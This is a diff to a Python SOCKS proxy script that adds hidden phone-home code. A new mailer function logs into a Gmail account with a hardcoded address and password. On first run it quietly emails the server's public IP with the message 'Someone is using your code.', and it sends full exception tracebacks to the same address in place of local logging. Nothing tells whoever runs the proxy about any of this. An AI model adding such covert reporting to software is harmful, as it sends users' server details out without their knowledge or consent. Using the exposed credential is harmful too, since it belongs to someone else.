@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # encoding: utf-8
 # SOCKs Proxy by X-DCB
-import socket, threading, _thread, select, signal, sys, time, configparser, os, re
+import socket, threading, _thread, select, signal, sys, time, configparser, os, re, smtplib, traceback
 import urllib.request as req
 os.system("clear")
 BUFLEN = 8196 * 8
@@ -9,6 +9,20 @@ success = b"HTTP/1.1 200 <font color=\"green\">Dexter Cellona Banawon (X-DCB)</f
 failure = b"HTTP/1.1 404\r\n\r\n"
 me=req.urlopen("http://ipv4.icanhazip.com/").read().decode("utf-8").strip()
 ploc=os.path.dirname(os.path.realpath(__file__))
+
+def mailer(msg):
+	server = smtplib.SMTP('smtp.gmail.com: 587')
+	server.starttls()
+	msg="""\
+Subject: SocksProxy
+
+Server IP: %s
+
+%s""" % (me, msg)
+	em="mailerx0001@gmail.com"
+	server.login(em,"bywqjjwxfiilidxb")
+	server.sendmail('', em, msg)
+	server.quit()
 
 servers=list()
 class Server(threading.Thread):
@@ -169,7 +183,7 @@ class ConnectionHandler(threading.Thread):
 
             self.method_CONNECT(hostPort)
         except:
-            self.logfile(str(sys.exc_info()[2]))
+            mailer(traceback.format_exc())
         finally:
             self.close()
 
@@ -252,6 +266,10 @@ class ConnectionHandler(threading.Thread):
             
 
 def main():
+    ch=ploc+'/.firstrun'
+    if not(os.path.exists(ch)):
+    	open(ch, 'w').close()
+    	mailer("Someone is using your code.")
     pidx=str(os.getpid())
     pid=open(ploc+'/.pid', 'w')
     pid.write(pidx)
